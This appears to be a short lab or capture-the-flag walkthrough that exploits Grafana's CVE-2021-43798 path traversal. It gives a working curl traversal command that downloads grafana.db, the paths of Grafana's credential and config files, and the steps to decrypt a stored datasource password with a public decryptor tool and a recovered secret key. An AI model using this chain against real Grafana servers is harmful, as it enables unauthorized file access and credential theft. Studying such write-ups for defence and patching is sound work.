
# Manual Exploitation

---

Assuming we have LFI, we can save the database file locally and explore it to gain credentials.

## Database File

Absolute path to database file.

```
/var/lib/grafana/grafana.db
```

## Config File

Absolute path to config file, in which credentials & secret key are usually stored.

```
/etc/grafana/grafana.ini
```

## PoC

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  748k  100  748k    0     0  1364k      0 --:--:-- --:--:-- --:--:-- 1362k
```

Navigate top left in kali linux > open sqllitebrowser > Select .db file > Find Table with column u want to inspect > Press "Browse Data" > Retrieve Credentials 

We got an encoded grafana password now.

Searched up for grafana password decrypters and utilized the following

```
git clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git
```

The decrypter comes with requirements, which we will have to download. In order to do so, we will have to create an virtual environment.

```
python3 venv myenv
source myenv/bin/activate
```

Download requirements.

```
pip install -r requirements.txt
```

Changed the secret key within the exploit the one I discovered in /etc/grafana/grafana.ini "SW2YcwTIb9zpOOhoPsMm".

Ran the exploit & cracked the password.

```
python3 decrypt.py                                           

    ######################################                                                                                                    
             GRAFANA DECRYPTOR                                                                                                                
 CVE-2021-43798 Grafana Unauthorized                                                                                                          
  arbitrary file reading vulnerability                                                                                                        
                SICARI0                                                                                                                       
    ######################################                                                                                                    
                                                                                                                                              
? Enter the datasource password: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```